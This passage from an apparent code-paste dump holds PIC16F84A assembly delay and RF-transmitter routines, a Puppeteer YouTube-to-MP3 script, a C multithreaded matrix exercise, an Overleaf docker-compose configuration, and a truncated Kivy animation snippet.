;	  E. Palacios, F. Remiro y L. López.		www.pic16f84a.com
; 	  Editorial Ra-Ma.  www.ra-ma.es
;	===================================================================
; RETARDOS de 20 hasta 500 microsegundos ------------------------------------------------
;
Retardo_500micros			; La llamada ""call"" aporta 2 ciclos máquina.
	nop				; Aporta 1 ciclo máquina.
	movlw	d'164'			; Aporta 1 ciclo máquina. Este es el valor de ""K"".
	goto	RetardoMicros		; Aporta 2 ciclos máquina.
Retardo_200micros				; La llamada ""call"" aporta 2 ciclos máquina.
	nop				; Aporta 1 ciclo máquina.
	movlw	d'64'			; Aporta 1 ciclo máquina. Este es el valor de ""K"".
	goto	RetardoMicros		; Aporta 2 ciclos máquina.
Retardo_100micros				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'31'			; Aporta 1 ciclo máquina. Este es el valor de ""K"".
	goto	RetardoMicros		; Aporta 2 ciclos máquina.
Retardo_50micros				; La llamada ""call"" aporta 2 ciclos máquina.
	nop				; Aporta 1 ciclo máquina.
	movlw	d'14'			; Aporta 1 ciclo máquina. Este es el valor de ""K"".
	goto	RetardoMicros		; Aporta 2 ciclos máquina.
Retardo_20micros				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'5'			; Aporta 1 ciclo máquina. Este es el valor de ""K"".
;
; El próximo bloque ""RetardoMicros"" tarda:
; 1 + (K-1) + 2 + (K-1)x2 + 2 = (2 + 3K) ciclos máquina.
;
RetardoMicros
	movwf	R_ContA			; Aporta 1 ciclo máquina.
Rmicros_Bucle
	decfsz	R_ContA,F		; (K-1)x1 cm (cuando no salta) + 2 cm (al saltar).
	goto	Rmicros_Bucle		; Aporta (K-1)x2 ciclos máquina.
	return				; El salto del retorno aporta 2 ciclos máquina.
;
;En total estas subrutinas tardan:
; - Retardo_500micros:	2 + 1 + 1 + 2 + (2 + 3K) = 500 cm = 500 µs. (para K=164 y 4 MHz).
; - Retardo_200micros:	2 + 1 + 1 + 2 + (2 + 3K) = 200 cm = 200 µs. (para K= 64 y 4 MHz).
; - Retardo_100micros:	2     + 1 + 2 + (2 + 3K) = 100 cm = 100 µs. (para K= 31 y 4 MHz).
; - Retardo_50micros :	2 + 1 + 1 + 2 + (2 + 3K) =  50 cm =  50 µs. (para K= 14 y 4 MHz).
; - Retardo_20micros :	2     + 1     + (2 + 3K) =  20 cm =  20 µs. (para K=  5 y 4 MHz).
       
    
; RETARDOS de 1 ms hasta 200 ms. --------------------------------------------------------

Retardo_200ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'200'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_100ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'100'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_50ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'50'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_20ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'20'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_10ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'10'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_5ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'5'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_2ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'2'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_1ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'1'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
;
; El próximo bloque ""Retardos_ms"" tarda:
; 1 + M + M + KxM + (K-1)xM + Mx2 + (K-1)Mx2 + (M-1) + 2 + (M-1)x2 + 2 =
; = (2 + 4M + 4KM) ciclos máquina. Para K=249 y M=1 supone 1002 ciclos máquina
; que a 4 MHz son 1002 µs = 1 ms.
;
Retardos_ms
	movwf	R_ContB			; Aporta 1 ciclo máquina.
R1ms_BucleExterno
	movlw	d'249'			; Aporta Mx1 ciclos máquina. Este es el valor de ""K"".
	movwf	R_ContA			; Aporta Mx1 ciclos máquina.
R1ms_BucleInterno
	nop				; Aporta KxMx1 ciclos máquina.
	decfsz	R_ContA,F		; (K-1)xMx1 cm (cuando no salta) + Mx2 cm (al saltar).
	goto	R1ms_BucleInterno		; Aporta (K-1)xMx2 ciclos máquina.
	decfsz	R_ContB,F		; (M-1)x1 cm (cuando no salta) + 2 cm (al saltar).
	goto	R1ms_BucleExterno 	; Aporta (M-1)x2 ciclos máquina.
	return				; El salto del retorno aporta 2 ciclos máquina.

; RETARDOS de 0.5 hasta 20 segundos ---------------------------------------------------
;
Retardo_20s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'200'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_10s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'100'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_5s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'50'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_2s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'20'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_1s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'10'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_500ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'5'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
;
; El próximo bloque ""Retardo_1Decima"" tarda:
; 1 + N + N + MxN + MxN + KxMxN + (K-1)xMxN + MxNx2 + (K-1)xMxNx2 +
;   + (M-1)xN + Nx2 + (M-1)xNx2 + (N-1) + 2 + (N-1)x2 + 2 =
; = (2 + 4M + 4MN + 4KM) ciclos máquina. Para K=249, M=100 y N=1 supone 100011
; ciclos máquina que a 4 MHz son 100011 µs = 100 ms = 0,1 s = 1 décima de segundo.
;
Retardo_1Decima
	movwf	R_ContC			; Aporta 1 ciclo máquina.
R1Decima_BucleExterno2
	movlw	d'100'			; Aporta Nx1 ciclos máquina. Este es el valor de ""M"".
	movwf	R_ContB			; Aporta Nx1 ciclos máquina.
R1Decima_BucleExterno
	movlw	d'249'			; Aporta MxNx1 ciclos máquina. Este es el valor de ""K"".
	movwf	R_ContA			; Aporta MxNx1 ciclos máquina.
R1Decima_BucleInterno          
	nop				; Aporta KxMxNx1 ciclos máquina.
	decfsz	R_ContA,F		; (K-1)xMxNx1 cm (si no salta) + MxNx2 cm (al saltar).
	goto	R1Decima_BucleInterno	; Aporta (K-1)xMxNx2 ciclos máquina.
	decfsz	R_ContB,F		; (M-1)xNx1 cm (cuando no salta) + Nx2 cm (al saltar).
	goto	R1Decima_BucleExterno	; Aporta (M-1)xNx2 ciclos máquina.
	decfsz	R_ContC,F		; (N-1)x1 cm (cuando no salta) + 2 cm (al saltar).
	goto	R1Decima_BucleExterno2	; Aporta (N-1)x2 ciclos máquina.
	return				; El salto del retorno aporta 2 ciclos máquina.	
	
    END"
P5nfL0Cb,Transmisor_RF_433MHz,ericksm,MPASM,Thursday 9th of May 2024 12:13:51 AM CDT," __CONFIG   _CP_OFF &  _WDT_OFF & _PWRTE_ON & _XT_OSC
 LIST P=16F84A
 INCLUDE  <P16F84A.INC>

  ERRORLEVEL -302
  
variables udata_shr 0x0C
Contador    res 1	    ; El contador a visualizar.
Count1	    res 1
R_ContA	    res 1	    ; Contadores para los retardos.
R_ContB	    res 1
R_ContC	    res 1
	

; ZONA DE CÓDIGOS ********************************************************************
    org	    0x00
    goto    INICIO
 
INICIO
    bsf	    STATUS,RP0	    ; Acceso al Banco 1.
    clrf    TRISB	    ; Las líneas del Puerto B se configuran como salida.
    movlw   b'00001111'	    ; Las 4 líneas del Puerto A se configuran como entrada.
    movwf   TRISA
    bcf	    STATUS,RP0	    ; Acceso al Banco 0.
    clrf    PORTB	    ; comenzamos con bit 0 en la salida
Principal
    movf    PORTA,W	    ; Lee el valor de las variables de entrada.
    andlw   b'00001111'	    ; Se queda con los 4 bits bajos de entrada.
    movwf   Contador        ; guardo dato enviado
    btfsc   STATUS,2
    goto    Fin
    call    Retardo_20ms    ; Espera que se estabilicen los niveles de tensión.
;compruebo que sea el mismo dato
    movf    PORTA,W	    ; Lee el valor de las variables de entrada.
    andlw   b'00001111'	    ; Se queda con los 4 bits bajos de entrada.
    subwf   Contador,0
    btfss   STATUS,2	    ; Comprueba si es un rebote.
    goto    Fin		    ; Era un rebote y sale fuera.
    clrf    Count1
;Pulsador correcto, procedo a enviar datos.   
    bsf	    PORTB,3
;envia los datos
    bsf	    PORTB,1	    ; activa el tx
;primero envia el dato STAR   (1 7ms y 0 5ms)
    call    DATOUNO
    bcf	    PORTB,0
    call    Retardo_5ms	
;envio dato
BITS
    btfss   Contador,0
    goto    PREDATO
    call    DATOUNO
CONTINUAR
    rrf	    Contador,1
    incf    Count1
    movf    Count1,W	    ; Lee el valor de las variables de entrada.
    sublw   d'4'
    btfss   STATUS,2
    goto    BITS
;espacio entre dato y dato enviado
    bcf	    PORTB,0
    bcf	    PORTB,1
    bcf	    PORTB,3
    call    Retardo_20ms
Fin	
    goto    Principal

PREDATO
   call	    DATOCERO
   goto	    CONTINUAR
DATOUNO
   bsf	    PORTB,0
   call	    Retardo_5ms
   return
DATOCERO
   bcf	    PORTB,0
   call	    Retardo_5ms
   return

;//////////////// RETARDOS ///////////////////////
;	===================================================================
;	  Del libro ""MICROCONTROLADOR PIC16F84. DESARROLLO DE PROYECTOS""
;	  E. Palacios, F. Remiro y L. López.		www.pic16f84a.com
; 	  Editorial Ra-Ma.  www.ra-ma.es
;	===================================================================
; RETARDOS de 1 ms hasta 200 ms. --------------------------------------------------------

Retardo_200ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'200'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_100ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'100'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_50ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'50'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_20ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'20'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_10ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'10'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_5ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'5'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_2ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'2'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
	goto	Retardos_ms		; Aporta 2 ciclos máquina.
Retardo_1ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'1'			; Aporta 1 ciclo máquina. Este es el valor de ""M"".
;
; El próximo bloque ""Retardos_ms"" tarda:
; 1 + M + M + KxM + (K-1)xM + Mx2 + (K-1)Mx2 + (M-1) + 2 + (M-1)x2 + 2 =
; = (2 + 4M + 4KM) ciclos máquina. Para K=249 y M=1 supone 1002 ciclos máquina
; que a 4 MHz son 1002 µs = 1 ms.
;
Retardos_ms
	movwf	R_ContB			; Aporta 1 ciclo máquina.
R1ms_BucleExterno
	movlw	d'249'			; Aporta Mx1 ciclos máquina. Este es el valor de ""K"".
	movwf	R_ContA			; Aporta Mx1 ciclos máquina.
R1ms_BucleInterno
	nop				; Aporta KxMx1 ciclos máquina.
	decfsz	R_ContA,F		; (K-1)xMx1 cm (cuando no salta) + Mx2 cm (al saltar).
	goto	R1ms_BucleInterno		; Aporta (K-1)xMx2 ciclos máquina.
	decfsz	R_ContB,F		; (M-1)x1 cm (cuando no salta) + 2 cm (al saltar).
	goto	R1ms_BucleExterno 	; Aporta (M-1)x2 ciclos máquina.
	return				; El salto del retorno aporta 2 ciclos máquina.

; RETARDOS de 0.5 hasta 20 segundos ---------------------------------------------------
;
Retardo_20s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'200'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_10s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'100'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_5s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'50'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_2s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'20'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_1s				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'10'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
	goto	Retardo_1Decima		; Aporta 2 ciclos máquina.
Retardo_500ms				; La llamada ""call"" aporta 2 ciclos máquina.
	movlw	d'5'			; Aporta 1 ciclo máquina. Este es el valor de ""N"".
;
; El próximo bloque ""Retardo_1Decima"" tarda:
; 1 + N + N + MxN + MxN + KxMxN + (K-1)xMxN + MxNx2 + (K-1)xMxNx2 +
;   + (M-1)xN + Nx2 + (M-1)xNx2 + (N-1) + 2 + (N-1)x2 + 2 =
; = (2 + 4M + 4MN + 4KM) ciclos máquina. Para K=249, M=100 y N=1 supone 100011
; ciclos máquina que a 4 MHz son 100011 µs = 100 ms = 0,1 s = 1 décima de segundo.
;
Retardo_1Decima
	movwf	R_ContC			; Aporta 1 ciclo máquina.
R1Decima_BucleExterno2
	movlw	d'100'			; Aporta Nx1 ciclos máquina. Este es el valor de ""M"".
	movwf	R_ContB			; Aporta Nx1 ciclos máquina.
R1Decima_BucleExterno
	movlw	d'249'			; Aporta MxNx1 ciclos máquina. Este es el valor de ""K"".
	movwf	R_ContA			; Aporta MxNx1 ciclos máquina.
R1Decima_BucleInterno          
	nop				; Aporta KxMxNx1 ciclos máquina.
	decfsz	R_ContA,F		; (K-1)xMxNx1 cm (si no salta) + MxNx2 cm (al saltar).
	goto	R1Decima_BucleInterno	; Aporta (K-1)xMxNx2 ciclos máquina.
	decfsz	R_ContB,F		; (M-1)xNx1 cm (cuando no salta) + Nx2 cm (al saltar).
	goto	R1Decima_BucleExterno	; Aporta (M-1)xNx2 ciclos máquina.
	decfsz	R_ContC,F		; (N-1)x1 cm (cuando no salta) + 2 cm (al saltar).
	goto	R1Decima_BucleExterno2	; Aporta (N-1)x2 ciclos máquina.
	return				; El salto del retorno aporta 2 ciclos máquina.

	
	
    END"
UcQJvsmg,[JS] YOUTUBE MP3 DOWNLOADER,WILDAN_IZZUDIN,JavaScript,Thursday 9th of May 2024 12:05:09 AM CDT,"const puppeteer = require('puppeteer');
const iPhone = puppeteer.devices['iPhone 12']

module.exports = async url => {
   const browser = await puppeteer.launch({
      headless: 'new',
      args: [
         ""--fast-start"",
         ""--disable-extensions"",
         ""--no-sandbox"",
         ""--disable-setuid-sandbox"",
         ""--no-gpu"",
         ""--disable-background-timer-throttling"",
         ""--disable-renderer-backgrounding"",
         ""--override-plugin-power-saver-for-testing=never"",
         ""--disable-extensions-http-throttling"",
         ""--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3""
      ]
   })
   try {
      const page = await browser.newPage()
      await page.emulate(iPhone)
      await page.goto('https://ytmp3s.nu', {
         waitUntil: 'networkidle2',
         timeout: 0
      })
      await page.type('input#url', url)
      await page.click('input[value=""Convert""]')
      await page.waitForSelector('#progress', {
         hidden: true
      })
      const fileName = await page.evaluate(() => {
         const el = document.querySelector('form > div')
         return el ? el.innerText: ''
      })
      const fileUrl = await page.evaluate(() => {
         const el = document.querySelector('form > div > a[rel=""nofollow""]')
         return el ? el.href: ''
      })
      await browser.close()
      if (!fileUrl) return ({
         status: false,
         msg: `Can't contvert file!`
      })
      return ({
         status: true,
         data: {
            filename: fileName + '.mp3',
            url: fileUrl
         }
      })
   } catch (e) {
      await browser.close()
      return ({
         status: false,
         msg: e.message
      })
   }
}"
CNPQCqF9,fourth_task,artmexbet,C,Wednesday 8th of May 2024 11:39:40 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <string.h>
#include <semaphore.h>

#define ROWS 4
#define COLS 5

struct ThreadResult {
    int count;
    int indexes[6];
};

struct TaskQueue {
    struct TaskQueue *next;
    struct ThreadResult result;
    int threadNumber;
};

struct ThreadInfo {
    int matrix[ROWS][COLS];
    int deltaX;
    int deltaY;
    int threadNumber;
};

void fill_matrix(int array[ROWS][COLS]) {
    srand(time(NULL));
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            array[i][j] = 1 + rand() % 3;
        }
    }
}

void print_matrix(int array[ROWS][COLS]) {
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            printf(""%d "", array[i][j]);
        }
        printf(""\n"");
    }
}

pthread_mutex_t mutex;
struct TaskQueue *head = NULL;
struct TaskQueue *new = NULL;
struct TaskQueue *tail = NULL;

sem_t sem;

void *get_values(void *info_) {
    sem_wait(&sem);

    struct ThreadInfo *info = (struct ThreadInfo *) info_;
    struct ThreadResult *result = (struct ThreadResult *) malloc(sizeof(struct ThreadResult));
    result->count = 0;
    for (int i = 0; i < ROWS; i++) {
        for (int j = 0; j < COLS; j++) {
            int k = 0;
            int lengthOfHorizontal = 0; // Сюда сохраняем длину повторяющихся символов в строке
            while (0 < j + k && j + k < COLS && info->matrix[i][j + k] == info->matrix[i][j]) {
                lengthOfHorizontal++;
                int l = 0;
                int lengthOfVertical = 0; // Сюда сохраняем длину повторяющихся символов в столбце
                while (0 < i + l && i + l < ROWS && info->matrix[i + l][j + k] == info->matrix[i][j + k]) {
                    lengthOfVertical++;
                    l += info->deltaX;
                }
                if (lengthOfHorizontal + lengthOfVertical > result->count) {
                    result->indexes[0] = i;
                    result->indexes[1] = j;
                    result->indexes[2] = i;
                    result->indexes[3] = j + k;
                    if (l != 0) {
                        result->indexes[4] = i + l - 1 * info->deltaX;
                        // Если в l добавлялись элементы, значение в ней будет на единицу больше (или меньше,
                        // в зависимости от deltaX) из-за того, что мы сначала проверяем, а уже затем увеличиваем l
                        // в цикле while выше
                    } else {
                        // Если же l = 0, вычитать ничего не нужно, нужно лишь записать эту же строку в нужный индекс
                        result->indexes[4] = i;
                    }
                    result->indexes[5] = j + k;
                    result->count = lengthOfHorizontal + lengthOfVertical;
                    // Используем мьютекс для записи промежуточного результата в общую очередь
                    // Лочим поток
                    pthread_mutex_lock(&mutex);
                    tail->result = *result;
                    tail->threadNumber = info->threadNumber;
                    // Выделяем место для следующей операции
                    new = (struct TaskQueue *) malloc(sizeof(struct TaskQueue));
                    tail->next = new;
                    // Заменяем последний элемент на текущий
                    tail = new;
                    // Разблокируем поток
                    pthread_mutex_unlock(&mutex);
                }
                k += info->deltaY;
            }
        }
    }
    sem_post(&sem);
    return (void *) result;
}

void find_g(int matrix[ROWS][COLS], int k) {
    // Инициализация очереди операций и мьютекса
    head = (struct TaskQueue *) malloc(sizeof(struct TaskQueue));
    tail = head;
    pthread_mutex_init(&mutex, NULL);

    sem_init(&sem, 1, k);

    int maxCount = 0;
    int coords[] = {0, 0, 0, 0, 0, 0};
    struct ThreadInfo rightUpper, leftUpper, leftLower, rightLower;
    struct ThreadResult *rightUpperResult, *leftUpperResult, *leftLowerResult, *rightLowerResult;
    memcpy(rightUpper.matrix, matrix, ROWS * COLS * sizeof(int));
    memcpy(leftUpper.matrix, matrix, ROWS * COLS * sizeof(int));
    memcpy(leftLower.matrix, matrix, ROWS * COLS * sizeof(int));
    memcpy(rightLower.matrix, matrix, ROWS * COLS * sizeof(int));
    rightUpper.deltaX = 1;
    rightUpper.deltaY = -1;
    rightUpper.threadNumber = 1;

    leftUpper.deltaX = -1;
    leftUpper.deltaY = -1;
    leftUpper.threadNumber = 2;

    leftLower.deltaX = -1;
    leftLower.deltaY = 1;
    leftLower.threadNumber = 3;

    rightLower.deltaX = 1;
    rightLower.deltaY = 1;
    rightLower.threadNumber = 4;

    pthread_t thread1, thread2, thread3, thread4;
    // По сути, каждый отдельный поток считает лучший результат для своего угла.
    // После этого основной поток (эта функция) собирает данные воедино и выводит результат
    pthread_create(&thread1, NULL, &get_values, &rightUpper);
    pthread_create(&thread2, NULL, &get_values, &leftUpper);
    pthread_create(&thread3, NULL, &get_values, &leftLower);
    pthread_create(&thread4, NULL, &get_values, &rightLower);
    pthread_join(thread1, (void **) &rightUpperResult);
    pthread_join(thread2, (void **) &leftUpperResult);
    pthread_join(thread3, (void **) &leftLowerResult);
    pthread_join(thread4, (void **) &rightLowerResult);
    if (rightUpperResult->count > maxCount) {
        maxCount = rightUpperResult->count;
        memcpy(coords, rightUpperResult->indexes, sizeof(rightUpperResult->indexes));
    }
    if (leftUpperResult->count > maxCount) {
        maxCount = leftUpperResult->count;
        memcpy(coords, leftUpperResult->indexes, sizeof(leftUpperResult->indexes));
    }
    if (leftLowerResult->count > maxCount) {
        maxCount = leftLowerResult->count;
        memcpy(coords, leftLowerResult->indexes, sizeof(leftLowerResult->indexes));
    }
    if (rightLowerResult->count > maxCount) {
        maxCount = rightLowerResult->count;
        memcpy(coords, rightLowerResult->indexes, sizeof(rightLowerResult->indexes));
    }
    for (int i = 0; i < 6; i++) {
        printf(""%d "", coords[i]);
    }
    printf(""\nTask queue:\n"");
    struct TaskQueue *current = head;
    while (current->next != NULL) {
        printf(""Thread %d: "", current->threadNumber);
        for (int i = 0; i < 6; i++) {
            printf(""%d "", current->result.indexes[i]);
        }
        printf(""\n"");
        current = current->next;
    }
}

int main() {
//    printf(""Hello, World!\n"");
    printf(""Insert a k number: "");
    int k;
    scanf_s(""%d"", &k);
    int arr[ROWS][COLS] = {{0, 2, 0, 2, 0},
                           {0, 1, 1, 1, 0},
                           {2, 0, 2, 1, 1},
                           {0, 2, 0, 1, 1}};
//    fill_matrix(arr);
    print_matrix(arr);
    find_g(arr, k);
    return 0;
}
"
UQA7La73,sharelatex_overleaf_docker_compose,shinemic,YAML,Wednesday 8th of May 2024 10:58:26 PM CDT,"version: '2.2'
services:
    sharelatex:
        restart: always
        # Server Pro users:
        # image: quay.io/sharelatex/sharelatex-pro
        image: sharelatex/sharelatex
        container_name: sharelatex
        depends_on:
            mongo:
                condition: service_healthy
            redis:
                condition: service_started
        ports:
            - 9088:80
        links:
            - mongo
            - redis
        stop_grace_period: 60s
        volumes:
            - /data/volumes/sharelatex/sharelatex:/var/lib/sharelatex
            ########################################################################
            ####  Server Pro: Uncomment the following line to mount the docker  ####
            ####             socket, required for Sibling Containers to work    ####
            ########################################################################
            # - /var/run/docker.sock:/var/run/docker.sock
        environment:

            SHARELATEX_APP_NAME: Datalab Overleaf CE

            SHARELATEX_MONGO_URL: mongodb://mongo/sharelatex

            # Same property, unfortunately with different names in
            # different locations
            SHARELATEX_REDIS_HOST: redis
            REDIS_HOST: redis

            ENABLED_LINKED_FILE_TYPES: 'project_file,project_output_file'

            # Enables Thumbnail generation using ImageMagick
            ENABLE_CONVERSIONS: 'true'

            # Disables email confirmation requirement
            EMAIL_CONFIRMATION_DISABLED: 'true'

            # temporary fix for LuaLaTex compiles
            # see https://github.com/overleaf/overleaf/issues/695
            TEXMFVAR: /var/lib/sharelatex/tmp/texmf-var

            ## Set for SSL via nginx-proxy
            #VIRTUAL_HOST: 103.112.212.22

            # SHARELATEX_SITE_URL: http://sharelatex.mydomain.com
            # SHARELATEX_NAV_TITLE: Our ShareLaTeX Instance
            # SHARELATEX_HEADER_IMAGE_URL: http://somewhere.com/mylogo.png
            # SHARELATEX_ADMIN_EMAIL: support@it.com

            # SHARELATEX_LEFT_FOOTER: '[{""text"": ""Powered by <a href=\""https://www.sharelatex.com\"">ShareLaTeX</a> 2016""},{""text"": ""Another page I want to link to can be found <a href=\""here\"">here</a>""} ]'
            # SHARELATEX_RIGHT_FOOTER: '[{""text"": ""Hello I am on the Right""} ]'

            # SHARELATEX_EMAIL_FROM_ADDRESS: ""team@sharelatex.com""

            # SHARELATEX_EMAIL_AWS_SES_ACCESS_KEY_ID:
            # SHARELATEX_EMAIL_AWS_SES_SECRET_KEY:

            # SHARELATEX_EMAIL_SMTP_HOST: smtp.mydomain.com
            # SHARELATEX_EMAIL_SMTP_PORT: 587
            # SHARELATEX_EMAIL_SMTP_SECURE: false
            # SHARELATEX_EMAIL_SMTP_USER:
            # SHARELATEX_EMAIL_SMTP_PASS:
            # SHARELATEX_EMAIL_SMTP_TLS_REJECT_UNAUTH: true
            # SHARELATEX_EMAIL_SMTP_IGNORE_TLS: false
            # SHARELATEX_EMAIL_SMTP_NAME: '127.0.0.1'
            # SHARELATEX_EMAIL_SMTP_LOGGER: true
            # SHARELATEX_CUSTOM_EMAIL_FOOTER: ""This system is run by department x""

            # ENABLE_CRON_RESOURCE_DELETION: true

            ################
            ## Server Pro ##
            ################

            # SANDBOXED_COMPILES: 'true'

            # SANDBOXED_COMPILES_SIBLING_CONTAINERS: 'true'
            # SANDBOXED_COMPILES_HOST_DIR: '/var/sharelatex_data/data/compiles'

            # DOCKER_RUNNER: 'false'

            ## Works with test LDAP server shown at bottom of docker compose
            # SHARELATEX_LDAP_URL: 'ldap://ldap:389'
            # SHARELATEX_LDAP_SEARCH_BASE: 'ou=people,dc=planetexpress,dc=com'
            # SHARELATEX_LDAP_SEARCH_FILTER: '(uid={{username}})'
            # SHARELATEX_LDAP_BIND_DN: 'cn=admin,dc=planetexpress,dc=com'
            # SHARELATEX_LDAP_BIND_CREDENTIALS: 'GoodNewsEveryone'
            # SHARELATEX_LDAP_EMAIL_ATT: 'mail'
            # SHARELATEX_LDAP_NAME_ATT: 'cn'
            # SHARELATEX_LDAP_LAST_NAME_ATT: 'sn'
            # SHARELATEX_LDAP_UPDATE_USER_DETAILS_ON_LOGIN: 'true'

            # SHARELATEX_TEMPLATES_USER_ID: ""578773160210479700917ee5""
            # SHARELATEX_NEW_PROJECT_TEMPLATE_LINKS: '[ {""name"":""All Templates"",""url"":""/templates/all""}]'


            # SHARELATEX_PROXY_LEARN: ""true""

    mongo:
        restart: always
        image: mongo:4.4
        container_name: mongo
        command: ""--replSet overleaf""
        expose:
          - 27017
        volumes:
          - /data/volumes/sharelatex/mongo_data:/data/db
        healthcheck:
          test: echo 'db.stats().ok' | mongo localhost:27017/test --quiet
          interval: 10s
          timeout: 10s
          retries: 5

    mongoinit:
        image: mongo:4.4
        # this container will exit after executing the command
        restart: ""no""
        depends_on:
          mongo:
            condition: service_healthy
        entrypoint:
          [
            ""mongo"",
            ""--host"",
            ""mongo:27017"",
            ""--eval"",
            'rs.initiate({ _id: ""overleaf"", members: [ { _id: 0, host: ""mongo:27017"" } ] })',
          ]

    redis:
        restart: always
        image: redis:6.2
        container_name: redis
        expose:
            - 6379
        volumes:
            - /data/volumes/sharelatex/redis_data:/data

    # ldap:
    #    restart: always
    #    image: rroemhild/test-openldap
    #    container_name: ldap
    #    expose:
    #        - 389

    # See https://github.com/jwilder/nginx-proxy for documentation on how to configure the nginx-proxy container,
    # and https://github.com/overleaf/overleaf/wiki/HTTPS-reverse-proxy-using-Nginx for an example of some recommended
    # settings. We recommend using a properly managed nginx instance outside of the Overleaf Server Pro setup,
    # but the example here can be used if you'd prefer to run everything with docker-compose

    # nginx-proxy:
    #     image: jwilder/nginx-proxy
    #     container_name: nginx-proxy
    #     ports:
    #       #- ""80:80""
    #       - ""443:443""
    #     volumes:
    #       - /var/run/docker.sock:/tmp/docker.sock:ro
    #       - /home/sharelatex/tmp:/etc/nginx/certs
"
ffy9Z3wV,repeat the function,jevixlugya,Python,Wednesday 8th of May 2024 10:51:14 PM CDT,"class Content(Screen):
    def on_enter(self):
        self.set_animation()

    def set_animation(self,*args):
        anim=Animation(opacity=1,duration=1)    
        anim+=Animation(opacity=1,duration=7)
        anim+=Animation(opacity=0,duration=7)
        #self.anim.repeat = True
        anim.start(self.ids.bg)
        anim.bind(on_complete=self.comp)

    def comp(self,*args):
        self.ids.bg.source='images/1.jpg'
        anim=Animation(opacity=1,duration=1)    
        anim+=Animation(opacity=1,duration=7)
        anim+=Animation(opacity=0,duration=7)       
        anim.start(self.ids.bg)     
        anim.bind(on_complete=self.compl)

    def compl(self,*args):
